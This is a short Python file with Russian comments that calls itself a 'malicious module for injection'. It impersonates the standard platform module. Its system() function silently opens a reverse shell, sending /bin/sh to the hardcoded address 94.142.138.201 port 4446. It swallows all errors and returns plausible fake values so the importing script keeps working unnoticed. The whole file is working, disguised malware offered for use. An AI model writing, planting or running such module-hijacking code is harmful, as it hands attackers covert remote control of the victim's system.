# platform.py - вредоносный модуль для инъекции
import os
import socket
import subprocess
import sys

# Функция для reverse shell
def reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("94.142.138.201", 4446))
        
        # Перенаправляем stdin, stdout, stderr в сокет
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        # Запускаем shell
        subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        pass

# Переопределяем system() чтобы запускать reverse shell
def system():
    reverse_shell()
    return "Linux"  # Возвращаем что-то похожее на нормальное значение

# Другие необходимые функции чтобы не сломать скрипт
def release():
    return "6.1.0-kali7-amd64"

def machine():
    return "x86_64"

def processor():
    return "x86_64"

def python_implementation():
    return "CPython"

def python_version():
    return "3.11.4"

# Имитируем другие атрибуты модуля
version = "1.0"
